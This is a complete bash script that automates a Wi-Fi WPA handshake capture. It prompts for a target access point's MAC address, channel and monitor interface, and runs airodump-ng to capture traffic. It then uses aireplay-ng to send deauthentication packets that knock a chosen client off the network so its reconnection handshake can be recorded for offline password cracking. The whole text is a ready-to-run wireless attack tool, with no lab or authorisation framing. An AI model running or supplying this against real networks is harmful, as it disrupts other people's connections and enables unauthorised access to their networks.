#!/bin/bash

# Check if airodump-ng and aireplay-ng are installed
if ! command -v airodump-ng &> /dev/null || ! command -v aireplay-ng &> /dev/null
then
    echo "airodump-ng or aireplay-ng is not installed. Please install them and try again."
    exit 1
fi

# Prompt for the MAC address of the target AP
read -p "Enter the MAC address of the target AP: " ap_mac

# Validate MAC address format (basic check)
if [[ ! $ap_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "Invalid MAC address format. Please use the format XX:XX:XX:XX:XX:XX."
    exit 1
fi

# Prompt for the wireless interface in monitor mode
read -p "Enter the wireless interface in monitor mode (e.g., wlan0mon): " interface

# Prompt for the channel
read -p "Enter the channel of the target AP: " channel

# Set output file for capturing handshake
timestamp=$(date +"%Y%m%d_%H%M%S")
output_file="handshake_$timestamp"

echo "Starting airodump-ng to capture handshake..."

# Run airodump-ng to capture handshake
gnome-terminal -- airodump-ng --bssid "$ap_mac" --channel "$channel" --write "$output_file" "$interface"

# Give airodump-ng a few seconds to initialize
sleep 5

# Ask for the target client's MAC address
read -p "Enter the MAC address of a connected client (or press Enter to skip deauth): " client_mac

# If a client MAC address is provided, send deauthentication packets
if [[ $client_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "Sending deauthentication packets to client $client_mac..."
    sudo aireplay-ng --deauth 10 -a "$ap_mac" -c "$client_mac" "$interface"
else
    echo "No client MAC provided. Skipping deauthentication step."
fi

echo "Handshake capture in progress. Use Ctrl+C in airodump-ng window to stop capture when done."

# Indicate where the capture file will be saved
echo "Handshake capture saved to ${output_file}-01.cap"
